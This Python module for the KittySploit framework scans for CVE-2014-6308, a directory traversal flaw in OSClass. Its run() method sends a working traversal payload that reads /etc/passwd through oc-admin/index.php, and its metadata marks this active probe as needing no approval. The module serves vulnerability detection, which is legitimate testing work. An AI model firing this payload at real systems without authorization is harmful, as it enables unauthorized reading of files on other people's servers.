#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A directory traversal vulnerability in OSClass before 3."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Osclass Security Advisory 3.4.1 - Local File Inclusion Detection',
        'description': 'A directory traversal vulnerability in OSClass before 3.4.2 allows remote attackers to read arbitrary files via a .. (dot dot) in the file parameter in a render action to oc-admin/index.php.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2014', 'lfi', 'packetstorm', 'osclass', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://packetstormsecurity.com/files/128285/OsClass-3.4.1-Local-File-Inclusion.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2014-6308',
            'https://github.com/osclass/Osclass/commit/c163bf5910d0d36424d7fc678da6b03a0e443435',
            'https://www.netsparker.com/lfi-vulnerability-in-osclass/',
            'http://blog.osclass.org/2014/09/15/osclass-3-4-2-ready-download/',
        ],
        'cve': 'CVE-2014-6308',
    }

    def run(self):
        r = self.http_request(method="GET", path='/osclass/oc-admin/index.php?page=appearance&action=render&file=../../../../../../../../../../etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='medium',
                reason="Osclass Security Advisory 3.4.1 - Local File Inclusion detected",
                path='/osclass/oc-admin/index.php?page=appearance&action=render&file=../../../../../../../../../../etc/passwd',
            )
            return True
        return False

